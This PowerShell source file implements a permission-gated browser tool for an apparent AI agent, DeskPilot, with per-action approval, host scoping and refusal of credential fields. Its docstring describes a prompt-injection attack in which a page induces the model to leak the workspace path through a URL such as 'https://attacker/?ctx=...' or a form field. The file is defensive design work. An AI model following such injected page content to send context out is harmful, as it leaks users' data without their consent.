function Invoke-DpBrowserTool {
    <#
    .SYNOPSIS
        DeskPilot's browser Tool: reads a page, and writes to one only when the
        Project allows it and the user approves each action.
    .DESCRIPTION
        Registered inside the Engine Runspace as browser_page, behind its own
        browserAutomation Permission.

        **Reading is the default and needs no Project grant.** open, click_link,
        read_page and screenshot have no external effect, which is what breaks
        the agency leg of the lethal trifecta by architecture rather than by
        policy.

        **Writing is a per-Project grant that gives some of that leg back**, and
        it is treated accordingly. fill, submit, upload and download are each
        granted separately in Settings, absent by default, and every call is
        approved individually. There is no safe-list here, unlike the terminal:
        `git status` is genuinely routine, but there is no routine submission to
        someone else's system, so tiering would only be a way of not asking.

        The egress leg is the one that needed designing, and the reason is not
        obvious. The browser holds no secrets - the profile is disposable and no
        credential is reachable from it. But the *Model* holds the conversation,
        the Workspace Folder path and prior Turn content, and the Model chooses
        both the URL and the values it types. So an injected page that induces a
        navigation to https://attacker/?ctx=<workspace path>, or a form fill that
        puts that path into a field the page can read, exfiltrates without any
        file being read. That is what the scope, the card and the value display
        exist for.

        Three properties, in the order they are enforced:

        1. **Capability decides whether the action exists at all.** A Project
           without `submit` has no button-pressing action - it is refused before
           any approval, so a user cannot be talked into granting it in the
           moment.
        2. **The gate blocks before the browser acts.** A pending card means
           nothing has been typed, pressed, sent or saved.
        3. **A grant is for this action, this Turn and these exact values.** The
           fingerprint binds the values themselves, so an approval cannot be
           replayed against different ones.

        Credential fields are refused outright rather than masked, and the
        refusal is made in the supervisor against the live input's own type - a
        field name is what an attacker controls. The user signs in themselves.
    .PARAMETER Action
        open, click_link, read_page, screenshot, fill_form, click_button or
        upload_file.
    .PARAMETER Url
        For open: the address to visit.
    .PARAMETER LinkText
        For click_link: the visible text of the link to follow.
    .PARAMETER Fields
        For fill_form: a JSON array of {"name","value"} objects.
    .PARAMETER SubmitWith
        For fill_form: the visible text of the button to press afterwards. Needs
        the submit capability as well as fill.
    .PARAMETER ButtonText
        For click_button: the visible text of the control to press.
    .PARAMETER FieldName
        For upload_file: the name or label of the file input.
    .PARAMETER Path
        For upload_file: a path inside the project folder.
    .OUTPUTS
        System.String - a compact JSON envelope.
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('open', 'click_link', 'read_page', 'screenshot', 'fill_form', 'click_button', 'upload_file', 'download_file')]
        [string]$Action,

        [string]$Url,

        [string]$LinkText,

        [string]$Fields,

        [string]$SubmitWith,

        [string]$ButtonText,

        [string]$FieldName,

        [string]$Path
    )

    $refuse = {
        param([string]$Message)
        (@{ ok = $false; error = $Message } | ConvertTo-Json -Compress)
    }

    $read = {
        param([string]$Name)
        $variable = Get-Variable -Name $Name -Scope Global -ErrorAction SilentlyContinue
        if ($variable) { $variable.Value } else { $null }
    }

    $context = & $read 'DeskPilotBrowserContext'
    if ($null -eq $context) {
        return (& $refuse 'Browser automation is not available in this session.')
    }

    $state = & $read 'DeskPilotBrowserState'
    if ($null -eq $state) {
        return (& $refuse 'Browser automation is not available in this session.')
    }

    $bridge = & $read 'DeskPilotBrowserBridge'
    $timeoutMinutes = [int](& $read 'DeskPilotBrowserTimeoutMinutes')
    $granted = @($context.actions)

    # Refused before any approval is offered, so a capability the Project never
    # granted cannot be talked into existence in the moment.
    $needs = {
        param([string]$Capability, [string]$What)
        if ($granted -contains $Capability) { return $null }
        "This project does not allow DeskPilot to $What in the browser. The user can turn that on for this project in settings; do not ask them to do it mid-task unless they raise it."
    }

    # Every response goes through here so the page the next approval names is the
    # page the browser is actually on, rather than the one the Model last asked
    # for - a redirect makes those different, and the card must show the real one.
    $finish = {
        param($Response)
        if ($Response.ok -and $Response.result -and $Response.result.PSObject.Properties['url']) {
            $state.lastUrl = [string]$Response.result.url
        }
        ConvertFrom-DpBrowserResult -Response $Response -Session $state.session
    }

    # A live page is required for everything except the first open.
    if ($Action -ne 'open' -and $null -eq $state.session) {
        return (& $refuse 'No page is open yet. Use open with a full https address first.')
    }

    if ($Action -eq 'open') {
        if ([string]::IsNullOrWhiteSpace($Url)) { return (& $refuse 'An address is required.') }

        # The first navigation seeds the scope from the address the task named;
        # after that the scope is fixed and a new host has to be approved.
        $scope = if ($null -eq $state.session) {
            @(Get-DpBrowserScope -StartUrl $Url -ProjectDomain @($context.projectDomains) -GrantedHost @($state.granted))
        }
        else {
            @($state.scope)
        }

        $decision = Resolve-DpBrowserUrlDecision -Url $Url -Scope $scope
        if ($decision.decision -eq 'deny') {
            return (& $refuse (Get-DpBrowserRefusal -Reason $decision.reason -TargetHost $decision.host))
        }

        if ($decision.decision -eq 'ask') {
            $approval = Request-DpBrowserApproval -Context $context -Class 'BrowserNavigation' `
                -Argument @{ url = $decision.url; host = $decision.host } `
                -Subject "opening $($decision.host)" -Bridge $bridge -TimeoutMinutes $timeoutMinutes
            if (-not $approval.approved) { return (& $refuse $approval.message) }

            $state.granted = @(@($state.granted) + $decision.host)
            $scope = @(Get-DpBrowserScope -StartUrl $Url -ProjectDomain @($context.projectDomains) -GrantedHost @($state.granted))
        }

        if ($null -eq $state.session) {
            $sessionParams = @{
                Scope        = $scope
                RuntimeRoot  = $context.runtimeRoot
                AllowDownload = ($granted -contains 'download')
                DownloadRoot = [string]$context.downloadRoot
            }
            try { $state.session = Start-DpBrowserSession @sessionParams }
            catch { return (& $refuse "The browser could not start: $_") }
            $state.scope = $scope
        }
        elseif (@($scope).Count -ne @($state.scope).Count) {
            $applied = Invoke-DpBrowserRequest -Session $state.session -Command 'scope' -Payload @{ hosts = $scope } -TimeoutSeconds 15
            if (-not $applied.ok) { return (& $refuse 'The browser refused the updated list of allowed sites, so nothing was opened.') }
            $state.scope = @($applied.result.scope)
        }

        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'navigate' -Payload @{ url = $Url } -TimeoutSeconds 90
        return (& $finish $response)
    }

    if ($Action -eq 'click_link') {
        if ([string]::IsNullOrWhiteSpace($LinkText)) { return (& $refuse 'A link name is required.') }
        if ($LinkText.Length -gt 200) { return (& $refuse 'That link name is too long to be a link name.') }
        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'click' -Payload @{ linkText = $LinkText } -TimeoutSeconds 90
        return (& $finish $response)
    }

    if ($Action -eq 'fill_form') {
        $missing = & $needs 'fill' 'type into forms'
        if ($missing) { return (& $refuse $missing) }

        $parsed = ConvertTo-DpBrowserField -Json $Fields
        if ($parsed.error) { return (& $refuse $parsed.error) }

        $submitting = -not [string]::IsNullOrWhiteSpace($SubmitWith)
        if ($submitting) {
            $missing = & $needs 'submit' 'send forms'
            if ($missing) { return (& $refuse $missing) }
            if ($SubmitWith.Length -gt 200) { return (& $refuse 'That button name is too long to be a button name.') }
        }

        $pageUrl = [string]$state.lastUrl
        $approval = Request-DpBrowserApproval -Context $context -Class 'BrowserAction' `
            -Argument @{
                action  = 'fill_form'
                url     = $pageUrl
                host    = (Resolve-DpBrowserUrlDecision -Url $pageUrl -Scope @($state.scope)).host
                control = $SubmitWith
                fields  = $parsed.fields
            } `
            -Subject 'filling in this form' -Bridge $bridge -TimeoutMinutes $timeoutMinutes
        if (-not $approval.approved) { return (& $refuse $approval.message) }

        $payload = @{ fields = $parsed.fields }
        if ($submitting) { $payload.submitWith = $SubmitWith }
        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'fill' -Payload $payload -TimeoutSeconds 90
        return (& $finish $response)
    }

    if ($Action -eq 'click_button') {
        $missing = & $needs 'submit' 'press buttons'
        if ($missing) { return (& $refuse $missing) }
        if ([string]::IsNullOrWhiteSpace($ButtonText)) { return (& $refuse 'A button name is required.') }
        if ($ButtonText.Length -gt 200) { return (& $refuse 'That button name is too long to be a button name.') }

        $pageUrl = [string]$state.lastUrl
        $approval = Request-DpBrowserApproval -Context $context -Class 'BrowserAction' `
            -Argument @{
                action  = 'click_button'
                url     = $pageUrl
                host    = (Resolve-DpBrowserUrlDecision -Url $pageUrl -Scope @($state.scope)).host
                control = $ButtonText
            } `
            -Subject "pressing $ButtonText" -Bridge $bridge -TimeoutMinutes $timeoutMinutes
        if (-not $approval.approved) { return (& $refuse $approval.message) }

        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'press' -Payload @{ buttonText = $ButtonText } -TimeoutSeconds 90
        return (& $finish $response)
    }

    if ($Action -eq 'upload_file') {
        $missing = & $needs 'upload' 'send files'
        if ($missing) { return (& $refuse $missing) }
        if ([string]::IsNullOrWhiteSpace($Path)) { return (& $refuse 'A file path inside the project is required.') }
        if ([string]::IsNullOrWhiteSpace($FieldName)) { return (& $refuse 'The name of the file field is required.') }

        # The path is confined to the Project by the same test every workspace
        # Tool uses. Page content never reaches this: the Model names a
        # project-relative path, and anything resolving outside is refused
        # rather than clamped.
        $root = [string]$context.projectRoot
        if ([string]::IsNullOrWhiteSpace($root)) { return (& $refuse 'No project folder is selected, so there is nothing to upload from.') }
        $full = Resolve-DpWorkspacePath -Root $root -Path $Path
        if (-not $full) { return (& $refuse 'That file is outside the project folder, so DeskPilot will not upload it.') }
        if (-not (Test-Path -LiteralPath $full -PathType Leaf)) { return (& $refuse 'There is no file at that path in the project folder.') }

        $info = Get-Item -LiteralPath $full
        if ($info.Length -gt 50MB) { return (& $refuse 'That file is larger than the 50 MB DeskPilot will upload.') }

        $pageUrl = [string]$state.lastUrl
        $approval = Request-DpBrowserApproval -Context $context -Class 'BrowserAction' `
            -Argument @{
                action   = 'upload_file'
                url      = $pageUrl
                host     = (Resolve-DpBrowserUrlDecision -Url $pageUrl -Scope @($state.scope)).host
                control  = $FieldName
                filePath = $full
            } `
            -Subject "uploading $($info.Name)" -Bridge $bridge -TimeoutMinutes $timeoutMinutes
        if (-not $approval.approved) { return (& $refuse $approval.message) }

        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'upload' `
            -Payload @{ fieldName = $FieldName; path = $full } -TimeoutSeconds 120
        return (& $finish $response)
    }

    if ($Action -eq 'download_file') {
        $missing = & $needs 'download' 'save files'
        if ($missing) { return (& $refuse $missing) }
        if ([string]::IsNullOrWhiteSpace($ButtonText)) { return (& $refuse 'The name of the download link or button is required.') }
        if ($ButtonText.Length -gt 200) { return (& $refuse 'That name is too long to be a link or button name.') }

        $pageUrl = [string]$state.lastUrl
        $approval = Request-DpBrowserApproval -Context $context -Class 'BrowserAction' `
            -Argument @{
                action   = 'download_file'
                url      = $pageUrl
                host     = (Resolve-DpBrowserUrlDecision -Url $pageUrl -Scope @($state.scope)).host
                control  = $ButtonText
                filePath = [string]$context.downloadRoot
            } `
            -Subject "saving that file" -Bridge $bridge -TimeoutMinutes $timeoutMinutes
        if (-not $approval.approved) { return (& $refuse $approval.message) }

        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'download' `
            -Payload @{ controlText = $ButtonText } -TimeoutSeconds 120
        return (& $finish $response)
    }

    if ($Action -eq 'screenshot') {
        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'screenshot' -TimeoutSeconds 60
        return (& $finish $response)
    }
    $response = Invoke-DpBrowserRequest -Session $state.session -Command 'read' -TimeoutSeconds 60
    & $finish $response
}
